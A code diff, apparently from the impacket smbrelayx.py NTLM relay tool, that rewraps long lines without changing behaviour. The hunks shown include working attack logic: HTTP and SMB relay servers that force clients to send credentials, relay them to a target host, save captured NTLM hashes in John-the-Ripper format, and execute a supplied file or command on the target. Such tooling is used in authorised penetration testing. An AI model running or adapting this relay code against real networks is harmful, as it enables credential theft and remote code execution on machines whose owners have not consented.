@@ -237,7 +237,9 @@ class SMBClient(smb.SMB):
 
         ppp = nrpc.ComputeNetlogonCredential('12345678', sessionKey)
 
-        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName+'\x00',ppp, 0x600FFFFF )
+        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00',
+                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName + '\x00',
+                                      ppp, 0x600FFFFF)
 
         clientStoredCredential = pack('<Q', unpack('<Q',ppp)[0] + 10)
 
@@ -252,7 +254,8 @@ class SMBClient(smb.SMB):
         request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
         request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = domainName
         request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = 0
-        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage['user_name'].decode('utf-16le')
+        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage[
+            'user_name'].decode('utf-16le')
         request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
         request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = challenge
         request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authenticateMessage['ntlm']
@@ -276,11 +279,13 @@ class SMBClient(smb.SMB):
             logging.error(str(e))
             return e.get_error_code()
 
-        logging.info("%s\\%s successfully validated through NETLOGON" % (domainName, authenticateMessage['user_name'].decode('utf-16le')))
+        logging.info("%s\\%s successfully validated through NETLOGON" % (
+        domainName, authenticateMessage['user_name'].decode('utf-16le')))
  
         encryptedSessionKey = authenticateMessage['session_key']
         if encryptedSessionKey != '':
-            signingKey = ntlm.generateEncryptedSessionKey(resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
+            signingKey = ntlm.generateEncryptedSessionKey(
+                resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
         else:
             signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey'] 
 
@@ -310,7 +315,7 @@ class SMBClient(smb.SMB):
         sessionSetup['Parameters']['MaxMpxCount']          = 2
         sessionSetup['Parameters']['VcNumber']             = 1
         sessionSetup['Parameters']['SessionKey']           = 0
-        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE
+        sessionSetup['Parameters']['Capabilities'] = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE
 
         # Fake Data here, don't want to get us fingerprinted
         sessionSetup['Data']['NativeOS']      = 'Unix'
@@ -353,7 +358,7 @@ class SMBClient(smb.SMB):
         sessionSetup['Parameters']['MaxMpxCount']          = 2
         sessionSetup['Parameters']['VcNumber']             = 1
         sessionSetup['Parameters']['SessionKey']           = 0
-        sessionSetup['Parameters']['Capabilities']         = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE
+        sessionSetup['Parameters']['Capabilities'] = SMB.CAP_EXTENDED_SECURITY | SMB.CAP_USE_NT_ERRORS | SMB.CAP_UNICODE
 
         # Let's build a NegTokenInit with the NTLMSSP
         # TODO: In the future we should be able to choose different providers
@@ -397,7 +402,8 @@ class SMBClient(smb.SMB):
 
 class HTTPRelayServer(Thread):
     class HTTPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
-        def __init__(self, server_address, RequestHandlerClass, target, exeFile, command, mode, outputFile, returnStatus = STATUS_SUCCESS):
+        def __init__(self, server_address, RequestHandlerClass, target, exeFile, command, mode, outputFile,
+                     returnStatus=STATUS_SUCCESS):
             self.target = target
             self.exeFile = exeFile
             self.command = command
@@ -418,9 +424,11 @@ class HTTPRelayServer(Thread):
             self.machineHashes = None
             self.domainIp = None
             if self.server.target is not None:
-                logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.server.target))
+                logging.info(
+                    "HTTPD: Received connection from %s, attacking target %s" % (client_address[0], self.server.target))
             else:
-                logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,client_address[0]))
+                logging.info(
+                    "HTTPD: Received connection from %s, attacking target %s" % (client_address[0], client_address[0]))
             SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
 
         def handle_one_request(self):
@@ -484,22 +492,29 @@ class HTTPRelayServer(Thread):
                 if authenticateMessage['user_name'] != '' or self.target == '127.0.0.1':
                     respToken2 = SPNEGO_NegTokenResp()
                     respToken2['ResponseToken'] = str(token)
-                    clientResponse, errorCode = self.client.sendAuth(self.challengeMessage['challenge'], respToken2.getData())
+                    clientResponse, errorCode = self.client.sendAuth(self.challengeMessage['challenge'],
+                                                                     respToken2.getData())
                 else:
                     # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials, except
                     # when coming from localhost
                     errorCode = STATUS_ACCESS_DENIED
 
                 if errorCode != STATUS_SUCCESS:
-                    logging.error("Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    logging.error("Authenticating against %s as %s\%s FAILED" % (
+                    self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
                     self.do_AUTHHEAD('NTLM')
                 else:
                     # Relay worked, do whatever we want here...
-                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
-                    ntlm_hash_data = outputToJohnFormat( self.challengeMessage['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
+                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (
+                    self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'],
+                                                        authenticateMessage['user_name'],
+                                                        authenticateMessage['domain_name'],
+                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                     logging.info(ntlm_hash_data['hash_string'])
                     if self.server.outputFile is not None:
-                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.outputFile)
+                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
+                                              self.server.outputFile)
 
                     clientThread = doAttack(self.client,self.server.exeFile,self.server.command)
                     clientThread.start()
@@ -546,7 +561,8 @@ class HTTPRelayServer(Thread):
 
     def run(self):
         logging.info("Setting up HTTP Server")
-        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.command, self.mode, self.outputFile)
+        httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.command, self.mode,
+                                self.outputFile)
         httpd.serve_forever()
 
 class SMBRelayServer(Thread):
@@ -707,7 +723,8 @@ class SMBRelayServer(Thread):
                 authenticateMessage = ntlm.NTLMAuthChallengeResponse()
                 authenticateMessage.fromString(token)
                 if authenticateMessage['user_name'] != '':
-                    clientResponse, errorCode = smbClient.sendAuth(connData['CHALLENGE_MESSAGE']['challenge'],sessionSetupData['SecurityBlob'])
+                    clientResponse, errorCode = smbClient.sendAuth(connData['CHALLENGE_MESSAGE']['challenge'],
+                                                                   sessionSetupData['SecurityBlob'])
                 else:
                     # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                     errorCode = STATUS_ACCESS_DENIED
@@ -727,16 +744,22 @@ class SMBRelayServer(Thread):
                     packet['ErrorClass']  = errorCode & 0xff
                     # Reset the UID
                     smbClient.setUid(0)
-                    logging.error("Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
-                    #del (smbData[self.target])
+                    logging.error("Authenticating against %s as %s\%s FAILED" % (
+                    self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    # del (smbData[self.target])
                     return None, [packet], errorCode
                 else:
                     # We have a session, create a thread and do whatever we want
-                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
-                    ntlm_hash_data = outputToJohnFormat( connData['CHALLENGE_MESSAGE']['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
+                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (
+                    self.target, authenticateMessage['domain_name'], authenticateMessage['user_name']))
+                    ntlm_hash_data = outputToJohnFormat(connData['CHALLENGE_MESSAGE']['challenge'],
+                                                        authenticateMessage['user_name'],
+                                                        authenticateMessage['domain_name'],
+                                                        authenticateMessage['lanman'], authenticateMessage['ntlm'])
                     logging.info(ntlm_hash_data['hash_string'])
                     if self.server.getJTRdumpPath() != '':
-                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
+                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
+                                              self.server.getJTRdumpPath())
                     del (smbData[self.target])
                     clientThread = doAttack(smbClient,self.exeFile,self.command)
                     clientThread.start()
@@ -746,7 +769,8 @@ class SMBRelayServer(Thread):
 
                 # Return status code of the authentication process.
                 errorCode = self.returnStatus
-                logging.info("Sending status code %s after authentication to %s" % (ERROR_MESSAGES[self.returnStatus][0], connData['ClientIP']))
+                logging.info("Sending status code %s after authentication to %s" % (
+                ERROR_MESSAGES[self.returnStatus][0], connData['ClientIP']))
 
                 respToken = SPNEGO_NegTokenResp()
                 # accept-completed
@@ -777,7 +801,10 @@ class SMBRelayServer(Thread):
             # SMBRelay
             smbClient = smbData[self.target]['SMBClient']
             if sessionSetupData['Account'] != '':
-                clientResponse, errorCode = smbClient.login_standard(sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
+                clientResponse, errorCode = smbClient.login_standard(sessionSetupData['Account'],
+                                                                     sessionSetupData['PrimaryDomain'],
+                                                                     sessionSetupData['AnsiPwd'],
+                                                                     sessionSetupData['UnicodePwd'])
             else:
                 # Anonymous login, send STATUS_ACCESS_DENIED so we force the client to send his credentials
                 errorCode = STATUS_ACCESS_DENIED
@@ -801,12 +828,14 @@ class SMBRelayServer(Thread):
                 # Now continue with the server
             else:
                 # We have a session, create a thread and do whatever we want
-                ntlm_hash_data = outputToJohnFormat( '', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'], sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'] )
+                ntlm_hash_data = outputToJohnFormat('', sessionSetupData['Account'], sessionSetupData['PrimaryDomain'],
+                                                    sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
                 logging.info(ntlm_hash_data['hash_string'])
                 if self.server.getJTRdumpPath() != '':
-                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.getJTRdumpPath())
+                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
+                                          self.server.getJTRdumpPath())
                 del (smbData[self.target])
-                clientThread = doAttack(smbClient,self.exeFile,self.command)
+                clientThread = doAttack(smbClient, self.exeFile, self.command)
                 clientThread.start()
                 # Remove the target server from our connection list, the work is done
                 # Now continue with the server
@@ -816,7 +845,8 @@ class SMBRelayServer(Thread):
             # Do the verification here, for just now we grant access
             # TODO: Manage more UIDs for the same session
             errorCode = self.returnStatus
-            logging.info("Sending status code %s after authentication to %s" % (ERROR_MESSAGES[self.returnStatus][0], connData['ClientIP']))
+            logging.info("Sending status code %s after authentication to %s" % (
+            ERROR_MESSAGES[self.returnStatus][0], connData['ClientIP']))
             connData['Uid'] = 10
             respParameters['Action'] = 0
 
@@ -882,16 +912,23 @@ if __name__ == '__main__':
     # Init the example's logger theme
     logger.init()
     print version.BANNER
-    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will try to SMB relay that connection to the target system or the original client")
+    parser = argparse.ArgumentParser(add_help=False,
+                                     description="For every connection received, this module will try to SMB relay that connection to the target system or the original client")
     parser.add_argument("--help", action="help", help='show this help message and exit')
-    parser.add_argument('-h', action='store', metavar = 'HOST', help='Host to relay the credentials to, if not it will relay it back to the client')
-    parser.add_argument('-s', action='store', choices = {'success','denied','logon_failure' }, default='success', help='Status to return after client performed authentication. Default: "success".')
-    parser.add_argument('-e', action='store', required=False, metavar = 'FILE', help='File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
-    parser.add_argument('-c', action='store', type=str, required=False, metavar = 'COMMAND', help='Command to execute on target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+    parser.add_argument('-h', action='store', metavar='HOST',
+                        help='Host to relay the credentials to, if not it will relay it back to the client')
+    parser.add_argument('-s', action='store', choices={'success', 'denied', 'logon_failure'}, default='success',
+                        help='Status to return after client performed authentication. Default: "success".')
+    parser.add_argument('-e', action='store', required=False, metavar='FILE',
+                        help='File to execute on the target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
+    parser.add_argument('-c', action='store', type=str, required=False, metavar='COMMAND',
+                        help='Command to execute on target system. If not specified, hashes will be dumped (secretsdump.py must be in the same directory)')
     parser.add_argument('-outputfile', action='store',
                         help='base output filename for encrypted hashes. Suffixes will be added for ntlm and ntlmv2')
-    parser.add_argument('-machine-account', action='store', required=False, help='Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name')
-    parser.add_argument('-machine-hashes', action="store", metavar = "LMHASH:NTHASH", help='Domain machine hashes, format is LMHASH:NTHASH')
+    parser.add_argument('-machine-account', action='store', required=False,
+                        help='Domain machine account to use when interacting with the domain to grab a session key for signing, format is domain/machine_name')
+    parser.add_argument('-machine-hashes', action="store", metavar="LMHASH:NTHASH",
+                        help='Domain machine hashes, format is LMHASH:NTHASH')
     parser.add_argument('-domain', action="store", help='Domain FQDN or IP to connect using NETLOGON')
 
     try:
